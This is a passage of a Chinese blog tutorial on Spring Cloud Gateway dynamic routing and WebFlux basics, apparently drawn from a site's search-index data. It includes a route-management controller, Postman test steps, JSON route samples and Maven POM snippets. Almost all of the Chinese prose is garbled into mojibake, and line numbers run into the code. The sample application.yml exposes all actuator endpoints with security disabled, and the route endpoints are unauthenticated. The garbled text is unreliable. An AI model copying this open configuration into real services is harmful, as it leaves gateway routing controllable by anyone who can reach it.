GatewayRouteDefinition gwdefinition) { RouteDefinition definition = dynamicRouteService.assembleRouteDefinition(gwdefinition); return this.dynamicRouteService.add(definition) ? "success" : "fail"; } /** * åˆ é™¤è·¯ç”± * * @param id * @return */ @GetMapping("/delete/{id}") public String delete(@PathVariable String id) { return this.dynamicRouteService.delete(id) ? "success" : "fail"; } /** * æ›´æ–°è·¯ç”± * * @param gwdefinition * @return */ @PostMapping("/update") public String update(@RequestBody GatewayRouteDefinition gwdefinition) { RouteDefinition definition = dynamicRouteService.assembleRouteDefinition(gwdefinition); return this.dynamicRouteService.update(definition) ? "success" : "fail"; }} ç¼–å†™åº”ç”¨çš„å¯åŠ¨ä¸»ç±» 1234567@SpringBootApplicationpublic class GatewayServerApplication { public static void main(String[] args) { SpringApplication.run(GatewayServerApplication.class, args); }} ç¼–å†™ application.yml é…ç½®æ–‡ä»¶ï¼š 1234567891011121314server: port: 9090spring: application: name: gateway-servermanagement: endpoints: web: exposure: include: \'*\' security: enabled: false æµ‹è¯•ç»“æœ i. å¯åŠ¨ gateway åº”ç”¨ii. è®¿é—® http://127.0.0.1:9090/actuator/gateway/routesï¼Œæ­¤æ—¶è¿”å›çš„è·¯ç”±ä¿¡æ¯åº”è¯¥ä¸ºç©º []iii. é€šè¿‡ Postman è®¿é—® http://127.0.0.1:9090/route/addï¼Œå‘èµ· Post è¯·æ±‚æ·»åŠ è·¯ç”±é…ç½®ä¿¡æ¯ï¼Œå…¶ä¸­éœ€è¦æäº¤çš„ JSON æ•°æ®å¦‚ä¸‹ï¼š 1234567891011121314{ "filters": [], "id": "jd_route", "order": 0, "predicates": [ { "args": { "pattern": "/jd" }, "name": "Path" } ], "uri": "http://www.jd.com"} iiii. å†æ¬¡è®¿é—® http://127.0.0.1:9090/actuator/gateway/routesï¼Œæ­¤æ—¶åº”è¯¥å¯ä»¥è¿”å›ä¸Šé¢æ·»åŠ çš„è·¯ç”±é…ç½®ä¿¡æ¯iiiii. è®¿é—® http://127.0.0.1:9090/jdï¼Œå‘ç°å¯ä»¥æ­£å¸¸è·³è½¬åˆ°äº¬ä¸œå•†åŸçš„é¦–é¡µï¼Œè¯´æ˜ä¸Šé¢æ·»åŠ çš„è·¯ç”±é…ç½®ç”Ÿæ•ˆäº†iiiiii. é€šè¿‡ Postman è®¿é—® http://127.0.0.1:9090/route/updateï¼Œå‘èµ· Post è¯·æ±‚æ›´æ”¹è·¯ç”±é…ç½®ä¿¡æ¯ï¼Œå…¶ä¸­éœ€è¦æäº¤çš„ JSON æ•°æ®å¦‚ä¸‹ï¼š 1234567891011121314{ "filters": [], "id": "jd_route", "order": 0, "predicates": [ { "args": { "pattern": "/jd" }, "name": "Path" } ], "uri": "http://www.taobao.com"} iiiiiii. è®¿é—® http://127.0.0.1:9090/actuator/gateway/routesï¼Œå¯ä»¥å‘ç°è¿”å›çš„è·¯ç”±é…ç½®ä¿¡æ¯å·²ç»è¢«ä¿®æ”¹äº†iiiiiiii. è®¿é—® http://127.0.0.1:9090/jdï¼Œå‘ç°å¯ä»¥æˆåŠŸè·³è½¬åˆ°æ·˜å®ç½‘iiiiiiiii. é€šè¿‡ Postman è®¿é—® http://127.0.0.1:9090/route/delete/jd_routeï¼Œå‘èµ· Get è¯·æ±‚åˆ é™¤è·¯ç”±é…ç½®ä¿¡æ¯ æœ€åé™„ä¸Š JSON ç‰ˆçš„å®Œæ•´è·¯ç”±é…ç½®ç¤ºä¾‹ 1234567891011121314151617181920212223242526{ "filters": [ { "args": { "name": "hystrix", "fallbackUri": "forward:/fallback" }, "name": "Hystrix" }, { "args": {}, "name": "RateLimit" } ], "id": "jd_route", "order": 0, "predicates": [ { "args": { "pattern": "/jd" }, "name": "Path" } ], "uri": "http://www.jd.com"} Gateway é›†ç¾¤ä¸‹çš„åŠ¨æ€è·¯ç”±å®ç°ä¸Šé¢çš„ç¤ºä¾‹ç®€å•åœ°å®ç°äº†å•æœº Gateway çš„åŠ¨æ€è·¯ç”±ï¼Œå•æœº Gateway ä¸­çš„è·¯ç”±é…ç½®ä¿¡æ¯ä¿å­˜åœ¨å½“å‰å®ä¾‹çš„å†…å­˜ä¸­ï¼Œå®ä¾‹é‡å¯åä¼šä¸¢å¤±è·¯ç”±é…ç½®ä¿¡æ¯ï¼ŒåŒæ—¶æ— æ³•åšåˆ°æ•´ä¸ª Gateway é›†ç¾¤çš„åŠ¨æ€è·¯ç”±æ§åˆ¶ã€‚é€šè¿‡åˆ†æ Spring Cloud Gateway æºç å¯ä»¥å‘ç°ï¼Œé»˜è®¤çš„ RouteDefinitionWriter å®ç°ç±»æ˜¯ InMemoryRouteDefinitionRepositoryã€‚è€Œ RouteDefinitionRepository ç»§æ‰¿äº† RouteDefinitionWriterï¼Œæ˜¯ Spring Cloud Gateway å®˜æ–¹é¢„ç•™çš„æ¥å£ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¸‹é¢ä¸¤ç§æ–¹å¼æ¥å®ç°é›†ç¾¤ä¸‹çš„åŠ¨æ€è·¯ç”±æ§åˆ¶ï¼šRouteDefinitionWriter æ¥å£å’Œ RouteDefinitionRepository æ¥å£ã€‚åœ¨è¿™é‡Œæ¨èå®ç° RouteDefinitionRepository è¿™ä¸ªæ¥å£ï¼Œä»æ•°æ®åº“æˆ–è€…ä»é…ç½®ä¸­å¿ƒè·å–è·¯ç”±è¿›è¡ŒåŠ¨æ€é…ç½®ï¼›å…·ä½“å¯ä»¥å‚è€ƒä¸Šé¢å•æœºç‰ˆçš„åŠ¨æ€è·¯ç”±å®ç°ï¼Œåœ¨è¿™é‡Œä¸å†ç´¯è¿°ã€‚ å‚è€ƒèµ„æ–™ Spring Cloud Gatewayï¼ˆGreenwich.SR1ï¼‰ æ•´åˆ Swagger2 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Gateway å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡",url:"/posts/ec48bc77.html",text:'Reactor ä¸ WebFlux ä»‹ç»Reactor æ˜¯ä»€ä¹ˆä¸ºäº†åº”å¯¹é«˜å¹¶å‘çš„æœåŠ¡å™¨ç«¯å¼€å‘ï¼Œåœ¨ 2009 å¹´ çš„æ—¶å€™ï¼Œå¾®è½¯æå‡ºäº†ä¸€ä¸ªæ›´ä¼˜é›…åœ°å®ç°å¼‚æ­¥ç¼–ç¨‹çš„æ–¹å¼ - Reactive Programmingï¼Œä¸­æ–‡åæ˜¯å“åº”å¼ç¼–ç¨‹æˆ–è€…å«ååº”å¼ç¼–ç¨‹ã€‚éšåï¼Œå…¶å®ƒæŠ€æœ¯ä¹Ÿè¿…é€Ÿåœ°è·Ÿä¸Šäº†è„šæ­¥ï¼Œåƒ ES6 é€šè¿‡ Promise å¼•å…¥äº†ç±»ä¼¼çš„å¼‚æ­¥ç¼–ç¨‹æ–¹å¼ã€‚Netflix å’Œ TypeSafe å…¬å¸ä¹Ÿæä¾›äº† RxJavaã€Scalaã€Akka æŠ€æœ¯ï¼Œè®© Java å¹³å°ä¹Ÿæœ‰äº†èƒ½å¤Ÿå®ç°å“åº”å¼ç¼–ç¨‹çš„æ¡†æ¶ï¼Œç°åœ¨æ¯”è¾ƒç†ŸçŸ¥çš„ Hystrix å°±æ˜¯ä»¥ RxJava ä¸ºåŸºç¡€å¼€å‘çš„ã€‚åˆ°äº† 2017 å¹´ï¼Œè™½ç„¶å·²ç»æœ‰ä¸å°‘å…¬å¸åœ¨å®è·µå“åº”å¼ç¼–ç¨‹ï¼Œä½†æ•´ä½“æ¥è¯´åº”ç”¨èŒƒå›´ä¾æ—§ä¸å¤§ï¼Œä¸»è¦åŸå› åœ¨äºç¼ºå°‘ç®€å•æ˜“ç”¨çš„æŠ€æœ¯å°†å“åº”å¼ç¼–ç¨‹æ¨å¹¿æ™®åŠï¼Œè¯¸å¦‚ MVC æ¡†æ¶ã€HTTP å®¢æˆ·ç«¯ã€æ•°æ®åº“æŠ€æœ¯ç­‰æ•´åˆã€‚ç»ˆäºï¼Œåœ¨ 2017 å¹´ 9 æœˆ 28 æ—¥ï¼ŒSpring 5 æ­£å¼å‘å¸ƒï¼Œè€Œ Spring 5 å…¶æœ€å¤§çš„æ„ä¹‰å°±æ˜¯å°†å“åº”å¼ç¼–ç¨‹æŠ€æœ¯çš„æ™®åŠå‘å‰æ¨è¿›ä¸€å¤§æ­¥ã€‚åœ¨èƒŒåæ”¯æŒ Spring 5 å“åº”å¼ç¼–ç¨‹çš„æ¡†æ¶æ­£æ˜¯ Reactorï¼Œå®ƒæ˜¯ç”± Pivotal å…¬å¸ï¼ˆå¼€å‘ Spring ç­‰æŠ€æœ¯çš„å…¬å¸ï¼‰å¼€å‘çš„ï¼Œå®ç°äº† Reactive Programming æ€æƒ³ï¼Œç¬¦åˆ Reactive Streams è§„èŒƒï¼ˆReactive Streams æ˜¯ç”± Netflixã€TypeSafeã€Pivotal ç­‰å…¬å¸å‘èµ·çš„ï¼‰çš„ä¸€é¡¹æŠ€æœ¯ã€‚Reactive ä¸ Servlet çš„æŠ€æœ¯æ ˆå¯¹æ¯”å›¾å¦‚ä¸‹ï¼š WebFlux æ˜¯ä»€ä¹ˆSpring WebFlux æ˜¯ Spring 5.0 å¼•å…¥çš„æ–°çš„å“åº”å¼æ¡†æ¶ï¼ŒåŒºåˆ«äº Spring MVCï¼Œå®ƒä¸éœ€è¦ä¾èµ– Servlet APIï¼Œé‡‡ç”¨å¼‚æ­¥éé˜»å¡çš„æ¶æ„ï¼Œåº•å±‚åŸºäº Reactor æ¥å®ç°å“åº”å¼æµè§„èŒƒã€‚å› æ­¤ï¼ŒSpring WebFlux ç‰¹åˆ«é€‚åˆåº”ç”¨åœ¨ I/O å¯†é›†å‹çš„æœåŠ¡ä¸­ï¼Œæ¯”å¦‚å¾®æœåŠ¡ç½‘å…³è¿™æ ·çš„åº”ç”¨ä¸­ã€‚åœ¨ä¼ ç»Ÿçš„ Web æ¶æ„ä¸­ï¼Œæ¯”å¦‚ Struts2ã€Spring MVC ç­‰éƒ½æ˜¯åŸºäº Servlet API ä¸ Servlet å®¹å™¨åŸºç¡€ä¹‹ä¸Šè¿è¡Œçš„ï¼Œä½¿ç”¨çš„æ˜¯åŒæ­¥é˜»å¡å¼ I/O æ¨¡å‹ã€‚ä½†æ˜¯åœ¨ Servlet 3.1 ä¹‹åæœ‰äº†å¼‚æ­¥éé˜»å¡çš„æ”¯æŒï¼Œè€Œ Spring WebFlux é‡‡ç”¨çš„å°±æ˜¯å…¸å‹çš„å¼‚æ­¥éé˜»å¡æ¶æ„ï¼Œå®ƒçš„æ ¸å¿ƒæ˜¯åŸºäº Reactor çš„ç›¸å…³ API å®ç°ã€‚ç›¸å¯¹äºä¼ ç»Ÿçš„ Web æ¶æ„æ¥è¯´ï¼ŒSpring WebFlux å¯ä»¥è¿è¡Œåœ¨è¯¸å¦‚ Netty åŠæ”¯æŒ Servlet 3.1+ çš„å®¹å™¨ï¼ˆTomcatã€Jettyã€Undertowï¼‰ä¹‹ä¸Šï¼Œæ”¯æŒå¼‚æ­¥éé˜»å¡å¼ I/O æ¨¡å‹ + å‡½æ•°å¼ç¼–ç¨‹ï¼ˆä¾èµ– JDK 8ï¼‰ã€‚æ ¹æ®å®˜æ–¹çš„è¯´æ˜ï¼ŒSpring WebFlux å¹¶ä¸èƒ½ä½¿æ¥å£çš„å“åº”æ—¶é—´ç¼©çŸ­ï¼Œå®ƒä»…ä»…èƒ½å¤Ÿæå‡ååé‡å’Œä¼¸ç¼©æ€§ã€‚Spring WebFlux ä¸ ä¼ ç»Ÿ Web æ¶æ„çš„å¯¹æ¯”å›¾å¦‚ä¸‹ï¼š é¦–å…ˆéœ€è¦æ˜ç¡®çš„ä¸€ç‚¹å°±æ˜¯ï¼ŒSpring WebFlux ä¸æ˜¯ Spring MVC çš„æ›¿ä»£æ–¹æ¡ˆï¼è™½ç„¶ Spring WebFlux ä¹Ÿå¯ä»¥è¿è¡Œåœ¨ Servlet å®¹å™¨ä¹‹ä¸Šï¼ˆServlet 3.1+ï¼‰ï¼Œä½†æ˜¯ Spring WebFlux ä¸»è¦è¿˜æ˜¯åº”ç”¨åœ¨é€‚åˆä½¿ç”¨å¼‚æ­¥éé˜»å¡æ¨¡å‹çš„ä¸šåŠ¡åœºæ™¯ã€‚è€Œ Spring MVC æ˜¯åŒæ­¥é˜»å¡çš„ï¼Œå¦‚æœé¡¹ç›®åœ¨ Spring MVC æ¡†æ¶ä¸­å¤§é‡ä½¿ç”¨äº†éåŒæ­¥æ–¹æ¡ˆï¼Œé‚£ä¹ˆ Spring WebFlux æ‰æ˜¯é€‚ç”¨ï¼Œå¦åˆ™ä½¿ç”¨ Spring MVC æ‰æ˜¯é¦–é€‰ã€‚åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼ŒSpring MVC å’Œ Spring WebFlux å¯ä»¥æ··åˆä½¿ç”¨ï¼Œæ¯”å¦‚ä¸Šé¢å·²ç»æåˆ°çš„ï¼Œå¯¹äºé‚£äº› I/O å¯†é›†å‹æœåŠ¡ï¼ˆå¦‚ç½‘å…³ï¼‰å°±å¯ä»¥ä½¿ç”¨ Spring WebFlux æ¥å®ç°ã€‚Spring MVC å’Œ Spring WebFlux çš„å¯¹æ¯”å›¾å¦‚ä¸‹ï¼š Spring WebFlux é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨ Netty ä½œä¸ºæœåŠ¡å™¨ Spring WebFlux æš‚æ—¶ä¸æ”¯æŒ MySQLï¼Œæ”¯æŒ Redisã€MongoDBã€PostgreSQL Spring WebFlux ä½¿ç”¨çš„å“åº”å¼æµå¹¶ä¸æ˜¯ç”¨ JDK 9 æä¾›çš„ï¼Œè€Œæ˜¯åŸºäº Reactor å“åº”å¼æµåº“ Spring WebFlux ä¹Ÿå¯ä»¥ä½¿ç”¨ Spring MVC æ³¨è§£ï¼Œå¦‚ @Controllerï¼Œæ–¹ä¾¿åœ¨ä¸¤ä¸ª Web æ¡†æ¶ä¸­è‡ªç”±è½¬æ¢ Spring WebFlux ä¸ Spring MVC éƒ½å¯ä»¥ä½¿ç”¨ Tomcatã€Jettyã€Undertow ç­‰ Servlet å®¹å™¨ï¼ˆServlet 3.1+ï¼‰ Spring MVC å› ä¸ºæ˜¯ä½¿ç”¨çš„åŒæ­¥é˜»å¡å¼ I/O æ¨¡å‹ï¼Œæ›´æ–¹ä¾¿å¼€å‘äººå‘˜å¼€å‘å’Œæµ‹è¯•ä»£ç ï¼›ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœ Spring MVC èƒ½å¤Ÿæ»¡è¶³çš„åœºæ™¯ï¼Œå°±å°½é‡ä¸è¦ç”¨ Spring WebFlux Spring Cloud Gateway ä»‹ç»Spring Cloud Gateway æ˜¯ä»€ä¹ˆSpring Cloud Gateway æ˜¯ Spring å®˜æ–¹åŸºäº Spring 5.xã€Spring Boot 2.xã€Spring WebFlux å’Œ Reactor ç­‰æŠ€æœ¯å¼€å‘çš„ç½‘å…³ï¼Œæ—¨åœ¨ä¸ºå¾®æœåŠ¡æ¶æ„æä¾›ç®€å•ã€æœ‰æ•ˆä¸”ç»Ÿä¸€çš„ API è·¯ç”±ç®¡ç†æ–¹å¼ã€‚Spring Cloud Gateway ä½œä¸º Spring Cloud ç”Ÿæ€ç³»ç»Ÿä¸­çš„ç½‘å…³ï¼Œç›®æ ‡æ˜¯æ›¿ä»£ Netflix Zuul 1.xã€‚åœ¨ Spring Boot 2.0 ä»¥ä¸Šç‰ˆæœ¬ä¸­ï¼Œå¹¶æ²¡æœ‰å¯¹ Zuul 2.0 ä»¥ä¸Šæœ€æ–°é«˜æ€§èƒ½ç‰ˆæœ¬è¿›è¡Œé›†æˆï¼Œä»ç„¶ä½¿ç”¨ Zuul 1.x é Reactor æ¨¡å¼ï¼ˆåŸºäº Servlet 2.5 é˜»å¡æ¶æ„ï¼‰çš„æ—§ç‰ˆæœ¬ã€‚Spring Cloud Gateway å…¶ä¸ä»…æä¾›ç»Ÿä¸€çš„è·¯ç”±æ–¹å¼ï¼Œå¹¶ä¸”è¿˜åŸºäº Filter é“¾çš„æ–¹å¼æä¾›äº†ç½‘å…³åŸºæœ¬çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼šç†”æ–­ã€é‡è¯•ã€å®‰å…¨ã€ç›‘æ§ / æŒ‡æ ‡ã€é™æµç­‰ï¼Œæ›´å¤šèµ„æ–™å¯å‚è€ƒï¼šGateway å®˜æ–¹è‹±æ–‡æ–‡æ¡£ã€‚ Spring Cloud Gateway çš„æ ¸å¿ƒæ¦‚å¿µç½‘å…³æä¾› API å…¨æ‰˜ç®¡æœåŠ¡ï¼Œä¸°å¯Œçš„ API ç®¡ç†åŠŸèƒ½ï¼Œè¾…åŠ©ä¼ä¸šç®¡ç†å¤§è§„æ¨¡çš„ APIï¼Œä»¥é™ä½ç®¡ç†æˆæœ¬å’Œå®‰å…¨é£é™©ï¼ŒåŒ…æ‹¬åè®®é€‚é…ã€åè®®è½¬å‘ã€å®‰å…¨ç­–ç•¥ï¼ˆWAFï¼‰ã€é˜²åˆ·ã€æµé‡ã€ç›‘æ§æ—¥å¿—ç­‰åŠŸèƒ½ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç½‘å…³å¯¹å¤–æš´éœ²çš„ URL æˆ–è€…æ¥å£ä¿¡æ¯ï¼Œç»Ÿç§°ä¸ºè·¯ç”±ä¿¡æ¯ã€‚å¦‚æœç ”å‘è¿‡ç½‘å…³ä¸­é—´ä»¶ï¼Œæˆ–è€…ä½¿ç”¨æˆ–äº†è§£è¿‡ Zuul çš„å¼€å‘è€…ï¼Œä¼šçŸ¥é“ç½‘å…³çš„æ ¸å¿ƒè‚¯å®šæ˜¯ Filter ä»¥åŠ Filter Chainï¼ˆFilter è´£ä»»é“¾ï¼‰ã€‚Spring Cloud Gateway ä¹Ÿå…·æœ‰è·¯ç”±å’Œ Filter çš„æ¦‚å¿µï¼Œå…¶ä¸­æœ€é‡è¦çš„å‡ ä¸ªæ¦‚å¿µå¦‚ä¸‹ï¼š è·¯ç”±ï¼ˆrouteï¼‰ï¼šè·¯ç”±æ˜¯ç½‘å…³æœ€åŸºç¡€çš„éƒ¨åˆ†ï¼Œè·¯ç”±ä¿¡æ¯ç”±ä¸€ä¸ª IDã€ä¸€ä¸ªç›®çš„ URLã€ä¸€ç»„æ–­è¨€å·¥å‚å’Œä¸€ç»„ Filter ç»„æˆï¼›å¦‚æœè·¯ç”±æ–­è¨€ä¸ºçœŸï¼Œåˆ™è¯´æ˜è¯·æ±‚çš„ URL å’Œé…ç½®çš„è·¯ç”±åŒ¹é…ã€‚ æ–­è¨€ï¼ˆpredicateï¼‰ï¼šJava 8 ä¸­çš„æ–­è¨€å‡½æ•°ï¼ŒSpring Cloud Gateway ä¸­çš„æ–­è¨€å‡½æ•°è¾“å…¥ç±»å‹æ˜¯ Spring 5.0 æ¡†æ¶ä¸­çš„ ServerWebExchangeã€‚åœ¨ Spring Cloud Gateway ä¸­çš„æ–­è¨€å‡½æ•°å…è®¸å¼€å‘è€…å»å®šä¹‰åŒ¹é…æ¥è‡ªäº Http Request ä¸­çš„ä»»ä½•ä¿¡æ¯ï¼Œæ¯”å¦‚è¯·æ±‚å¤´å’Œå‚æ•°ç­‰ã€‚ è¿‡æ»¤å™¨ï¼ˆfilterï¼‰ï¼šä¸€ä¸ªæ ‡å‡†çš„ Spring Web Filterï¼Œåœ¨ Spring Cloud Gateway ä¸­çš„ Filter åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼Œåˆ†åˆ«æ˜¯ Gateway Filter å’Œ Global Filterï¼Œè¿‡æ»¤å™¨ Filter å°†ä¼šå¯¹è¯·æ±‚å’Œå“åº”è¿›è¡Œä¿®æ”¹å¤„ç†ã€‚ Spring Cloud Gateway çš„æ ¸å¿ƒåŸç†Spring Cloud Gateway çš„æ ¸å¿ƒå¤„ç†æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒGateway çš„å®¢æˆ·ç«¯ä¼šå‘ Spring Cloud Gateway å‘èµ·è¯·æ±‚ï¼Œè¯·æ±‚é¦–å…ˆä¼šè¢« HttpWebHandlerAdapter è¿›è¡Œæå–ç»„è£…æˆç½‘å…³çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åç½‘å…³çš„ä¸Šä¸‹æ–‡ä¼šä¼ é€’ç»™ DispatcherHandlerã€‚è¿™é‡Œçš„ DispatcherHandler æ˜¯æ‰€æœ‰è¯·æ±‚çš„åˆ†å‘å¤„ç†å™¨ï¼ŒDispatcherHandler ä¸»è¦è´Ÿè´£åˆ†å‘è¯·æ±‚åˆ°å¯¹åº”çš„å¤„ç†å™¨ï¼Œæ¯”å¦‚å°†è¯·æ±‚åˆ†å‘åˆ°å¯¹åº” RoutePredicateHandlerMappingï¼ˆè·¯ç”±æ–­è¨€å¤„ç†æ˜ å°„å™¨ï¼‰ã€‚è·¯ç”±æ–­è¨€å¤„ç†æ˜ å°„å™¨ä¸»è¦ç”¨äºè·¯ç”±çš„æŸ¥æ‰¾ï¼Œä»¥åŠæ‰¾åˆ°è·¯ç”±åè¿”å›å¯¹åº”çš„ FilteringWebHandlerã€‚FilteringWebHandler ä¸»è¦è´Ÿè´£ç»„è£… Filter é“¾è¡¨å¹¶è°ƒç”¨ Filter æ‰§è¡Œä¸€ç³»åˆ—çš„ Filter å¤„ç†ï¼Œç„¶åæŠŠè¯·æ±‚è½¬åˆ°åç«¯å¯¹åº”çš„ä»£ç†æœåŠ¡å¤„ç†ï¼Œå¤„ç†å®Œæ¯•ä¹‹åï¼Œå°† Response è¿”å›åˆ° Gateway å®¢æˆ·ç«¯ã€‚åœ¨ Filter é“¾ä¸­ï¼Œé€šè¿‡è™šçº¿åˆ†å‰² Filter çš„åŸå› æ˜¯ï¼Œè¿‡æ»¤å™¨å¯ä»¥åœ¨è½¬å‘è¯·æ±‚ä¹‹å‰å¤„ç†æˆ–è€…æ¥æ”¶åˆ°è¢«ä»£ç†æœåŠ¡çš„è¿”å›ç»“æœä¹‹åå¤„ç†ã€‚æ‰€æœ‰çš„ Pre ç±»å‹çš„ Filter æ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œæ‰ä¼šè½¬å‘è¯·æ±‚åˆ°è¢«ä»£ç†çš„æœåŠ¡å¤„ç†ã€‚è¢«ä»£ç†çš„æœåŠ¡æŠŠæ‰€æœ‰è¯·æ±‚å¤„ç†å®Œæ¯•ä¹‹åï¼Œæ‰ä¼šæ‰§è¡Œ Post ç±»å‹çš„è¿‡æ»¤å™¨ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨é…ç½®è·¯ç”±çš„æ—¶å€™ï¼Œå¦‚æœä¸æŒ‡å®šç«¯å£çš„è¯ï¼ŒHTTP é»˜è®¤è®¾ç½®ç«¯å£ä¸º 80ï¼ŒHTTPS é»˜è®¤è®¾ç½®ç«¯å£ä¸º 443ï¼ŒSpring Cloud Gateway çš„å¯åŠ¨å®¹å™¨ç›®å‰åªæ”¯æŒ Nettyã€‚ Spring Cloud Gateway å…¥é—¨æ¡ˆä¾‹1. ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ–‡ä¸­ï¼Œä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Finchley.RELEASEï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.0.3ï¼Œç‰¹åˆ«å£°æ˜é™¤å¤–ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 2. åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ã€‚ç‰¹åˆ«æ³¨æ„ï¼ŒSpring Cloud Gateway æ˜¯åŸºäº WebFlux çš„ï¼Œå®ƒä¸ Spring MVC æ˜¯ä¸å…¼å®¹çš„ï¼Œå¦‚æœå¼•ç”¨äº† spring-boot-starter-webï¼Œåˆ™éœ€è¦æŠŠ spring-webmvc æ’é™¤æ‰ï¼›ç”±äº Spring Cloud Gateway çš„å¯åŠ¨å®¹å™¨ç›®å‰åªæ”¯æŒ Nettyï¼Œå› æ­¤è¿˜éœ€è¦å°† spring-boot-starter-tomcat æ’é™¤æ‰ã€‚è¿™é‡Œä¹Ÿå¯ä»¥å¼•å…¥ spring-boot-starter-webflux æ¥æ›¿ä»£ Spring MVC çš„åŠŸèƒ½ï¼Œå…³äº Gateway çš„ä½¿ç”¨ï¼ŒåŸåˆ™ä¸Šåªéœ€è¦å¼•å…¥ spring-cloud-starter-gateway å³å¯ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt;&lt;/properties&gt;&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--æ³¨æ„ï¼šè¿™é‡Œéœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å„ç§ä¾èµ–é—®é¢˜ --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;${java.version}&lt;/source&gt; &lt;target&gt;${java.version}&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 3. åˆ›å»º Gateway å·¥ç¨‹åˆ›å»º Gateway çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Gateway çš„é…ç½®ç±»ï¼š 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { // å½“è®¿é—®åˆ° http://127.0.0.1:9090/jd ç›´æ¥è·³è½¬åˆ°äº¬ä¸œå•†åŸçš„é¦–é¡µ return builder.routes() .route(r -&gt; r.path("/jd") .uri("http://jd.com:80/").id("jd_route") ).build(); }} åˆ›å»º Gateway çš„ä¸»æ§åˆ¶ç±»ï¼š 1234567@SpringBootApplicationpublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} åˆ›å»º Gateway çš„ application.yml 